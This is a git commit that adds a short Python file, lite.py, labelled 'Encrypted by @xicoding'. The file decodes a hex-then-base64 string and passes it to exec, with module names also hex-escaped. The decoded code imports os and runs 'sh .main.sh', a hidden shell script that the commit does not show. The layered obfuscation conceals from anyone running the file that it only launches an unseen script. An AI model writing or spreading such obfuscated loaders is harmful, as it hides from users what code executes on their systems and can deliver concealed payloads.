9b014fe2a41a36fe83fd98f48cdea99dbace13dc
xicoding-z <109870748+xicoding-z@users.noreply.github.com>
2022-07-24 01:13:25 +0700

    Add files via upload

---
+++ lite.py
@@ -0,0 +1,9 @@
+# Encrypted by @xicoding
+
+lollollollollollollollollollollollollollol = ""
+lollollollollollollollollollollollollollol += "\x61\x57\x31\x77\x62\x33\x4a\x30\x49\x47"
+lollollollollollollollollollollollollollol += "\x39\x7a\x43\x6d\x39\x7a\x4c\x6e\x4e\x35"
+lollollollollollollollollollollollollollol += "\x63\x33\x52\x6c\x62\x53\x67\x69\x63\x32"
+lollollollollollollollollollollollollollol += "\x67\x67\x4c\x6d\x31\x68\x61\x57\x34\x75"
+lollollollollollollollollollollollollollol += "\x63\x32\x67\x69\x4b\x51\x6f\x3d"
+exec(__import__("\x62\x61\x73\x65\x36\x34").b64decode(lollollollollollollollollollollollollollol.encode("\x75\x74\x66\x2d\x38")).decode("\x75\x74\x66\x2d\x38"))
